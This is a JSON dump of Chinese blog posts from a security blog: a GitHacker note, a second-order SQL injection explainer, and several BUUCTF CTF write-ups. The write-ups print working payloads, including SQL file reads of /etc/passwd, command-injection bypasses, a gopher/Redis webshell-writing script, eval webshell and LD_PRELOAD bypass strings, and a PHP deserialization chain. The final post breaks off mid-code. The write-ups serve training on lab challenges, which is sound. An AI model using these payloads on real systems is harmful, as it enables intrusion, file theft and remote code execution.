[{"title":"GitHacker使用总结","url":"https://husins.cn/GitHacker使用总结/","content":"今天我中了GitHack的诡计，他竟然还有个强大的哥哥GitHacker\nGitHacker 和 Githack 有什么区别呢？GitHacker是一个多线程工具，用于检测站点是否存在git源码泄漏，并能够将网站源代码下载到本地。值得一提的是，这个工具会将整个git repo恢复到本地\nGithack，只是简单的恢复到最新版本。\n如此一来，通过GitHacker你就可以查看到开发人员的历史提交记录以及提交注释，以更好的掌握开发者的性格和心理，从而为进一步的代码审计奠定基础。\n它结合git命令能够产生妙用\npython githacker.py 127.0.0.1/.git/将git泄露的文件，下载到本地\ngit log --reflog 查看提交过的版本信息和分支信息\ngit reset -–hard彻底回退到某个版本，本地的源码也会变为上一个版本的内容\n\n","categories":["工具使用"],"tags":["git"]},{"title":"浅析二次注入","url":"https://husins.cn/浅析二次注入/","content":"什么是二次注入​        二次注入是指已存储（数据库，文件等）的用户输入被读取后再次进入到SQL查询语句中导致注入。可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。\n​        二次注入类似于存储型XSS，在提交payload的时候不会直接对WEB应用程序产生影响，通过其他的辅助剪辑的对WEB产生危害。\n为什么会出现二次注入​        本质上和SQL注入一样都是源于信任问题，不同的是二次注入是卡发着可能不信任直接来自于用户的数据，对其进行了严格的过滤和转义后进行了存储。但是对于已存储的数据就不会进行过滤，转义，取出后直接放入SQL语句中导致了二次注入的产生\n二次注入的原理​        \n（图片是我白嫖来的，嘻嘻）\n核心原理：数据在存入数据库后还原成了用户输入的形式，当在数据库取出的时候，没有再次进行过滤和转义，从而造成了二次注入。\n二次注入漏洞与普通注入漏洞的区别：\n二次注入是sql注入的一种，但是比普通sql注入难利用，利用门槛高\n普通注入数据直接进入到SQL查询中\n二次注入是输入数据经处理后存储，取出后，再次进入到SQL查询\n渗透过程越复杂，不确定因素越多，成功率越低。如果二次注入必须由管理员在后台来被动触发，更加难以实现\n二次注入漏洞只能靠人工，需要对应用有一个完整的理解\n\n二次注入可能存在在什么地方\n存在转义函数的地方\n\n在回溯数据输入的地方，如修改用户账户密码、修改文章标题\n\n跨语言的应用，容易导致问题。比如前台PHP，后台java\n\n日志相关：存日志时，读取了一些数据库里的信息，比如用户名等，然后又存储了一次\n\n跨程序的数据传递：程序A处理完后存储到数据库，程序B去读取，未进行过滤\n\n\n如何防御二次注入\n预处理+数据绑定\n对所有的输入一视同仁，不论输入来自用户还是存储，在进入SQL查询前都对其进行过滤，转义\n代码审查的时候，禁止开发用拼接的方式执行sql\n\n","categories":["漏洞总结"],"tags":["SQL"]},{"title":"Zer0pts2020之Can you guess it?","url":"https://husins.cn/Zer0pts2020之Can-you-guess-it/","content":"知识点\nstring random_bytes( int $length)：生成适合于加密使用的任意长度的加密随机字节字符串，例如在生成salt、密钥或初始化向量\nbasename函数\n&lt;?php$path = &quot;/testweb/home.php&quot;;//显示带有文件扩展名的文件名echo basename($path);//显示不带有文件扩展名的文件名echo basename($path,&quot;.php&quot;);?&gt; \n\n解题\n&lt;?phpinclude &#x27;config.php&#x27;; // FLAG is defined in config.phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123;  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));  exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#x27;guess&#x27;])) &#123;  $guess = (string) $_POST[&#x27;guess&#x27;];  if (hash_equals($secret, $guess)) &#123;    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;  &#125; else &#123;    $message = &#x27;Wrong.&#x27;;  &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;Can you guess it?&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h1&gt;Can you guess it?&lt;/h1&gt;    &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt;    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;    &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt;    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;&lt;?php &#125; ?&gt;    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;      &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;\n\n题目直接给了完整的源代码，进行代码审计\n\n过滤了config和.php两个关键字\n对变量$secret进行一个64位随机加密并转为16进制，如果变量guess和secret相等得到flag\n最下面特殊写法，打印Message变量\n\n难道这道题是伪随机数爆破？找了半天也没看出来发现咋利用，后知后觉，老子中计了\n看源代码的最开头部分，他的写法和平时不一样，多了一个basename函数，这个函数只保留最后文件名\n当URL传参/index.php/config.php/，则$_SERVER[&#39;PHP_SELF&#39;]返回/index.php/config.php/经过basename函数就会返回config.php,因此我们只需要绕过正则就能获得FLAG，真诱人呢\n绕过正则我们可以使用包含多字节字符的路径，找到一个basename识别不了的多字节即可绕过\n&lt;?phpfunction check($str) &#123;  return preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $str);&#125;for ($i = 0; $i &lt; 0x100; $i++) &#123;  $s = &#x27;/index.php/config.php/&#x27; . IntlChar::chr($i);  if (!check($s)) &#123;    $t = basename(&#x27;/index.php/config.php/&#x27; . chr($i));    echo &quot;$&#123;i&#125;: $&#123;t&#125;\\n&quot;;  &#125;&#125;?&gt;\n\n通过脚本，找到识别不到的字符实现绕过，Payload\n/index.php/config.php/%80?source\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯2018之Comment","url":"https://husins.cn/网鼎杯2018之Comment/","content":"知识点:\nGitHack工具的使用\n二次注入\nDocker文件位置，一般在/temp/html中会有备份\n解题\n\n打开题目第一次发帖需要你登陆,账号密码都给你了,只是没有给你密码后三位,意图很明显,使用爆破来进行登陆\n爆破成功后会发现密码为zhangwei666\n\n登陆之后存在发帖功能,想到了xss和SQL注入\n1.对XSS进行测试,发现这里存在反射型XSS没有什么意义\n2.SQL注入尝试了半天,没啥效果,一丢丢报错信息都没有,盲注的回显也没有\n剩下就没有什么思路了,只能看看有没有信息泄露的点\n\n在控制台发现一句提示,Git程序员跑路,可没可能是Git泄露,直接扫目录\n\n确实是Git泄露\n\n使用GItHack工具获取到源码,发下源码一点信息没有,前面提示没写完,这里猜测/.git文件不全,利用GitHack对其进行补全\n&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;:    $category = addslashes($_POST[&#x27;category&#x27;]);    $title = addslashes($_POST[&#x27;title&#x27;]);    $content = addslashes($_POST[&#x27;content&#x27;]);    $sql = &quot;insert into board            set category = &#x27;$category&#x27;,                title = &#x27;$title&#x27;,                content = &#x27;$content&#x27;&quot;;    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#x27;comment&#x27;:    $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0)&#123;    $category = mysql_fetch_array($result)[&#x27;category&#x27;];    $content = addslashes($_POST[&#x27;content&#x27;]);    $sql = &quot;insert into comment            set category = &#x27;$category&#x27;,                content = &#x27;$content&#x27;,                bo_id = &#x27;$bo_id&#x27;&quot;;    $result = mysql_query($sql);    &#125;    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;\n\n获取到完整的源代码,观察write部分发现sql语句都被进行了转义,这也是为啥之前测试SQL注入不成功的原因\n通过审计源代码我们不难发现这里存在一处很明显的二次注入,一开始会对category进行赋值,然后在查看时会将其取出,如果我们在categories输入&#39;123 /*在concent输入*/#，就会出现如下效果：\n$sql = &quot;insert into comment          set category = &#x27;&#x27;123/*&#x27;,              content = &#x27;*/#&#x27;,              bo_id = &#x27;$bo_id&#x27;&quot;;\n\n当123存入数据库再被取出时，如果存在命令执行，就会被执行。\n\n\n进行简单验证，果然可以，接下来就是要利用二次注入找到flag了\n首先看看用户信息，payload：\n&#x27;,content=(select load_file(&#x27;/etc/passwd&#x27;)),/*\n\n\n发现存在了一处可疑的www用户，去他的家目录看看他都有过什么操作，Payload：\n&#x27;,content=(select load_file(&#x27;/home/www/.bash_history&#x27;)),/*\n\n\n但是观察之后不难发现，他在/tmp目录下有过操作，这里经过看别人wp提示发现，由于目标环境是docker，所以 .DS_Store 文件应该在 /tmp/html 中。而 .DS_Store 文件中，经常会有一些不可见的字符，可以使用hex函数对其进行16进制转换 payload：\n&#x27;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*\n\n使用hackbar解码\n\n发现flag文件，直接访问\n\n确定FLAG文件存在，因此路径应该为/var/www/html/flag_8946e1ff1ee3e40f.php利用二次注入读取一下，**payload**\n&#x27;,content=(select hex(load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*\n\n\n完整流程如下：\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"CISCN2019 华北赛区 Day2 Web1之Hack World","url":"https://husins.cn/CISCN2019-华北赛区-Day2-Web1之Hack-World/","content":"知识点\nSQL异或运算: 假^假 =真 ，真^真=假，假^真=真，真^假=真,当我们查询 1^0、0^1、和 1 的回显是一样的，而查询 1^1 或0^0却会有报错提示\n解题\n\n\n\n经过测试,页面一共有三种回显,正常返回话,否则返回bool(false),出现过滤字符,返回SQL Injection Checked.\n由此可知,应该是布尔盲注,\n\n确实是布尔盲注,但是select之类的全部被过滤了,这里 采用新学的异或来进行绕过.\n编写盲注脚本,这里我们发现表名和字段名都给你了,直接找flag就可以了.\n\n使用二分法,得到flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"FBCTF2019之RCEService","url":"https://husins.cn/FBCTF2019之RCEService/","content":"知识点\n\nJSON执行命令格式&#123;&quot;cmd&quot;:&quot;命令&quot;&#125;\n%0A表示换行\nputenv函数:\n\n解题\n\n利用json格式输入命令\n\n发现,当前目录下只存在index.php一个文件,这里测试好多都不能继续进行,百度wp,发现当时给了源码\n&lt;?php putenv(&#x27;PATH=/home/rceservice/jail&#x27;); if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;  $json = $_REQUEST[&#x27;cmd&#x27;];   if (!is_string($json)) &#123;    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;  &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123;    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;  &#125; else &#123;    echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;;    $cmd = json_decode($json, true)[&#x27;cmd&#x27;];    if ($cmd !== NULL) &#123;      system($cmd);    &#125; else &#123;      echo &#x27;Invalid input&#x27;;    &#125;    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;  &#125;&#125;\n\n很多东西都过滤了，但是preg_match()函数只匹配一行，用%0a进行换行,代码中提示了路径,看看该路径下的文件\n?cmd=&#123;%0A&quot;cmd&quot;:&quot;ls /home/rceservice&quot;%0A&#125;\n\n\n发现存在flag文件,但是由于环境变量发生了改变,很多命令,没有被ban但是也无法直接使用,这里我们可以使用绝对路径来调用,\n?cmd=&#123;%0A&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;\n\n\n得到flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GKCTF2020之EZ三剑客-EzWeb","url":"https://husins.cn/GKCTF2020之EZ三剑客-EzWeb/","content":"知识点:\nfile协议被过滤后可以使用file:/ 和 file:&lt;空格&gt;///\n6379端口一般运行redis服务\n解题\n\n\n\n打开题目,访问输入URL都能正常的访问,但是本地127.0.0.1被ban了\n\n发现一个GET传参,尝试传参.\n\neth0 Link encap:Ethernet HWaddr 02:42:0a:cf:b7:09 inet addr:10.207.183.9 Bcast:10.207.183.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1450 Metric:1 RX packets:57 errors:0 dropped:0 overruns:0 frame:0 TX packets:56 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:10748 (10.7 KB) TX bytes:14359 (14.3 KB) eth1 Link encap:Ethernet HWaddr 02:42:ac:12:00:2d inet addr:172.18.0.45 Bcast:172.18.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:26 errors:0 dropped:0 overruns:0 frame:0 TX packets:15 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:18757 (18.7 KB) TX bytes:908 (908.0 B) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:18 errors:0 dropped:0 overruns:0 frame:0 TX packets:18 errors:0 dropped:0 overruns:0 carrier:0collisions:0 txqueuelen:1000 RX bytes:1729 (1.7 KB) TX bytes:1729 (1.7 KB)\n\n给了ip地址,10.207.183.9,想到ssrf,结合之前输入url,能够呈现网页内容,尝试使用伪协议读取一下源码\n\n\n&lt;?phpfunction curl($url)&#123;      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    echo curl_exec($ch);    curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123;\t\t$url = $_GET[&#x27;url&#x27;];\t\t//echo $url.&quot;\\n&quot;;\t\tif(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match))\t\t&#123;\t\t\t//var_dump($match);\t\t\tdie(&#x27;别这样&#x27;);\t\t&#125;\t\tcurl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123;\tsystem(&#x27;ifconfig&#x27;);&#125;?&gt;\n\n上面过滤了 file dict : / 127.0.0.1 localhost\n结合之前给的ip地址还没有利用上,可以使用http协议跑存活主机地址\n\n发现了一个网页的返回包存在提示,找到了存活主机,下一步就是找到服务端口\n\n发现6379端口出现的提示,查看6379开启的是什么服务\n通过百度发现6379一般开启的是redis服务\n\n下一步就应该是百度6379服务存在的漏洞,这里参照其他大佬的wp,发现redis存在未授权访问的漏洞,因为过滤了dict协议,所以使用gopher协议,利用大佬的脚本生成payload:\nimport urllibprotocol=&quot;gopher://&quot;ip=&quot;173.96.119.11&quot;      // 运行有redis的主机ipport=&quot;6379&quot;shell=&quot;\\n\\n\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;,\t &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),\t &quot;config set dir &#123;&#125;&quot;.format(path),\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),\t &quot;save&quot;\t ]if passwd:\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr):\tCRLF=&quot;\\r\\n&quot;\tredis_arr = arr.split(&quot; &quot;)\tcmd=&quot;&quot;\tcmd+=&quot;*&quot;+str(len(redis_arr))\tfor x in redis_arr:\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)\tcmd+=CRLF\treturn cmdif __name__==&quot;__main__&quot;:\tfor x in cmd:\t\tpayload += urllib.quote(redis_format(x))\tprint payload\n\n\n\n这里脚本进行命令执行可以,但是不能上传一句话木马,问题是啥暂时没有弄清楚\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"MRCTF2020之套娃","url":"https://husins.cn/MRCTF2020之套娃/","content":"知识点\n​          - PHP在解析查询字符串时会将所有参数转换为有效地变量名,此时\n\n 它会删除空白符\n将某些字符转化为下划线(包括空格)\n字符串换行符 可以表示字符串的结尾\n\n\n\n解题\n\n$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;    die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;    echo &quot;you are going to the next ~&quot;;&#125;\n\n打开题目查看源代码,发现一处注释,获取到源码一份\n第一个if不能出现_,可以根据字符串解析特性绕过\n第二个if要求 不能出现23333,但是正则要能匹配的到,而且第二个if中正则^和$代表的是行的开头和结尾,所以可以使用换行来绕过\n构造paylaod\n?b%20u%20p%20t=23333%0a\n\n\n提示FLAG在secrettw.php访问\n\n提示本地ip访问\n\n写入XFF头没有效果,但是发现有一串JS代码放到控制台看看\n\n看来是提示post传参\n\n&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123;     highlight_file(__FILE__);     die(); &#125; function change($v)&#123;     $v = base64_decode($v);     $re = &#x27;&#x27;;     for($i=0;$i&lt;strlen($v);$i++)&#123;         $re .= chr ( ord ($v[$i]) + $i*2 );     &#125;     return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; \n\n随便传入一个Merak的值,获得了当前页面的源码\nchange函数,相当于对于传入的值进行了 一次加密\n想要获得FLAG,要满足以下几点要求:\n\nIP等于127.0.0.1,这里XFF不能用,可以使用client-ip\n2333的值等于todat is a happy day,而且要绕过file_get_contents函数,可以使用伪协议绕过\n经过change函数加密后,仍然可以读取flag.php\n\n构造change的解密EXP\n\n因此,传参改ip即可\n\n得到FLAG\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"极客大挑战 2019之RCE ME","url":"https://husins.cn/极客大挑战-2019之RCE-ME/","content":"知识点\n环境变量 LD_preload + mail劫持so来执行系统命令:   通过linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE\nhttps://www.anquanke.com/post/id/175403https://www.freebuf.com/articles/web/192052.html\n解题\n打开题目获取源代码\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123;            $code=$_GET[&#x27;code&#x27;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;\n\n代码很简单,绕过正则造成命令执行,正则过滤的很严格 大小写字母和数字全部被过滤,因此选择取反绕过正则\n构造读取phpinfo的Exp\n\n?code=(~%8F%97%8F%96%91%99%90)();\n\n看到phpinfo()主要关注flag是否在里面,其次看disable_funcation禁用了那些\n\n没有FLAG存在\n\n绝大多数函数都被禁用\n构造一句话木马,连接蚁剑,绕过disable_funcation\n\n\n这个题就和之前挨骂,那个题是一样的了,这里有三种方法\n\n利用蚁剑自带插件绕过disable_funcation\n\n\n\n\n利用LD_preload + mail\n\n\n\n​     这里过长,参考网上的wp可以这样构造\n?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[_]);&amp;_=assert&amp;_=eval($_POST[&#x27;a&#x27;])?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/1.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so\n\n得到flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GWCTF 2019之枯燥的抽奖","url":"https://husins.cn/GWCTF-2019之枯燥的抽奖/","content":"知识点\nmt_rand:每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种。（播种是由mt_srand()函数完成的），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以前面也说到，同一个种子下随机生成的随机数值是相同的。因此,这是一个伪随机数,只要知道随机种子的值,就能破解.\n爆破工具:https://github.com/lepiaf/php_mt_seed\n伪随机数文章:https://www.freebuf.com/vuls/192012.html\n解题\n\n猜字符串都游戏,看到输入框,尝试SQL注入和XSS\n\n\n查看源码:\n\n前端传参处,存在一处url,尝试访问\n\n得到抽奖程序的源码,真不错,分析一下源码\n&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#x27;seed&#x27;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#x27;num&#x27;]))&#123;    if($_POST[&#x27;num&#x27;]===$str)&#123;x        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;);\n\n通过阅读源码可发现,通过随机数,生成一个长度为20的密码,输入密码就可以获取flag.\n首先将得到的前十个密码解析成php_mt_seed需要的参数Exp如下:\n&lt;?php$pass_now = &quot;FpCyLNvPOj&quot;;$allowable_characters = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;;$length = strlen($allowable_characters) - 1;for ($j = 0; $j &lt; strlen($pass_now); $j++) &#123;    for ($i = 0; $i &lt; $length; $i++) &#123;        if ($pass_now[$j] == $allowable_characters[$i]) &#123;            echo &quot;$i $i 0 $length &quot;;            break;        &#125;    &#125;&#125;?&gt;\n\n\n\n利用工具爆破得到种子,根据种子构造解密字符串的Exp:\n\n\n最终得到Flag.\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"MRCTF2020之Ezpop","url":"https://husins.cn/MRCTF2020之Ezpop/","content":"知识点\n魔术方法 __invoke()：当尝试以调用函数的方式调用一个对象时，该方法会被自动调用\n魔术方法__tostring()：将一个对象当做一个字符串来使用时，会自动调用该方法，并且在该方法中，可以返回一定的字符串，以表明该对象转换为字符串之后的结果\n魔术方法__get()：获得一个类的成员变量时调用,通过它可以在对象的外部获取私有成员属性的值,访问不存在的属性或是受限的属性时调用\n序列化Pop链：利用几个类之间相互关联进行构造\n解题\n打开题目，是php的代码,分析代码\nWelcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;\n\n一共存在三个类，先来看第一个类\nclass Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;\n\nappend()函数文件包含,注释中提到flag in flag.php因此,这里就是想办法 $value=flag.php\n接下来利用魔术方法对函数赋值,因此我们需要,以调用函数的方法调用这个对象完成赋值\n第二个类:\nclass Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;\n\n​                                                                                                                                                                    \n__wakeup()反序列化时自动调用,对$this-&gt;source做字符串比较,__toString返回str的source属性\n第三个类:\nclass Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;\n\n__get()把$this-&gt;p当成函数返回\n因此总结pop链的构造:\n\n首先实例化show类,此时反序列化会自动调用__wakeup通过preg_match()将$this-&gt;source做字符串比较，如果$this-&gt;source是show类，就调用了__toString()方法\n__toString会访问str的source属性,当str构造为Test类时,Test类不存在source属性,因此会调用__get方法\n__get()方法将p作为函数使用,因此当p实例化为Modifier类时,就可以调用__invoke方法,因此使用伪协议读取flag.php\n\n构造Exp:\n\npayload:?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A2%3A%22ad%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D\n\n最终得到Flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF2020之EasySearch","url":"https://husins.cn/BJDCTF2020之EasySearch/","content":"知识点\nssi注入:https://blog.csdn.net/qq_40657585/article/details/84260844\n解题\n\n打开题目,又是一个普普通通的登录框,尝试sql注入,没有效果,选择扫目录\n\n扫到一个源码泄露\n\n&lt;?php\tob_start();\tfunction get_hash()&#123;\t\t$chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;;\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\t\t$content = uniqid().$random;\t\treturn sha1($content); \t&#125;    header(&quot;Content-Type: text/html;charset=utf-8&quot;);\t***    if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; )    &#123;        $admin = &#x27;6d0bc1&#x27;;        if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123;            echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;;            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);            $text = &#x27;            ***            ***            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;            